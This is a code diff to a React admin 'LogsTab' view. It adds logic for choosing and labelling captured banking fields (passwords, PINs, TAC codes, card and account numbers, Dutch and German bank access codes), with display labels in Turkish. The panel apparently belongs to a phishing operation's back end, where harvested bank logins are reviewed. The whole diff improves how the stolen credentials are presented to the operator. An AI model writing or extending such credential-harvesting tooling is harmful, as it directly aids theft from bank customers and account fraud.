@@ -92,6 +92,53 @@ function shouldHideDuplicateBankField(formData: Record<string, any>, key: string
   return Boolean(canonicalValue) && canonicalValue === value.trim();
 }
 
+function isVisibleAdminBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
+  if (!value) return false;
+
+  const preferredKeys = new Set([
+    "loginMethod",
+    "personalCode",
+    "phone",
+    "username",
+    "verfuegernummer",
+    "password",
+    "pin",
+    "tacCode",
+    "pasnummer",
+    "rekeningnummer",
+    "toegangscode",
+    "signatuur",
+    "identificatiecode",
+  ]);
+
+  if (preferredKeys.has(key)) {
+    return true;
+  }
+
+  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
+  if (normalizedKey.includes("rememberme")) {
+    return false;
+  }
+
+  const canonicalKey = inferCanonicalLogFieldKey(key);
+  if (!canonicalKey) {
+    return false;
+  }
+
+  if (shouldHideDuplicateBankField(formData, key, value)) {
+    return false;
+  }
+
+  const canonicalValue =
+    canonicalKey === "username"
+      ? String(formData.username ?? formData.verfuegernummer ?? "").trim()
+      : canonicalKey === "password"
+        ? String(formData.password ?? formData.pin ?? "").trim()
+        : String(formData[canonicalKey] ?? "").trim();
+
+  return !canonicalValue;
+}
+
 export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
   const supabase = createBrowserSupabaseClient();
   const [rows, setRows] = useState<DemoSession[]>([]);
@@ -724,7 +771,7 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                                 "user_agent", "ip_address", "is_hidden"
                               ];
                               if (ignoredKeys.includes(key)) return false;
-                              return !shouldHideDuplicateBankField(fd, key, value);
+                              return isVisibleAdminBankField(fd, key, value);
                             })
                             .sort(([keyA], [keyB]) => {
                               const order = ["loginMethod", "personalCode", "phone", "username", "verfuegernummer", "password", "pin", "pasnummer", "rekeningnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"];
@@ -736,19 +783,20 @@ export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
                               return keyA.localeCompare(keyB);
                             })
                             .map(([key, value]) => {
-                              let displayKey = key;
-                              if (key === "username") displayKey = "K.Adı";
-                              else if (key === "verfuegernummer") displayKey = "ID / K.Adı";
-                              else if (key === "password" || key === "pin") displayKey = "Şifre / PIN";
-                              else if (key === "tacCode") displayKey = "TAC";
-                              else if (key === "rekeningnummer") displayKey = "Hesap No";
-                              else if (key === "pasnummer") displayKey = "Kart No";
-                              else if (key === "toegangscode") displayKey = "Giriş Kodu";
-                              else if (key === "signatuur") displayKey = "İmza";
-                              else if (key === "identificatiecode") displayKey = "Kimlik Kodu";
-                              else if (key === "loginMethod") displayKey = "Giriş Yöntemi";
-                              else if (key === "personalCode") displayKey = "Kimlik No / ID";
-                              else if (key === "phone") displayKey = "Telefon";
+                              const inferredKey = inferCanonicalLogFieldKey(key);
+                              let displayKey = inferredKey ?? key;
+                              if (displayKey === "username") displayKey = "ID / K.Adı";
+                              else if (displayKey === "verfuegernummer") displayKey = "ID / K.Adı";
+                              else if (displayKey === "password" || displayKey === "pin") displayKey = "Şifre / PIN";
+                              else if (displayKey === "tacCode") displayKey = "TAC";
+                              else if (displayKey === "rekeningnummer") displayKey = "Hesap No";
+                              else if (displayKey === "pasnummer") displayKey = "Kart No";
+                              else if (displayKey === "toegangscode") displayKey = "Giriş Kodu";
+                              else if (displayKey === "signatuur") displayKey = "İmza";
+                              else if (displayKey === "identificatiecode") displayKey = "Kimlik Kodu";
+                              else if (displayKey === "loginMethod") displayKey = "Giriş Yöntemi";
+                              else if (displayKey === "personalCode") displayKey = "Kimlik No / ID";
+                              else if (displayKey === "phone") displayKey = "Telefon";
                               
                               return (
                                 <div key={key} className="flex gap-1.5 items-start">
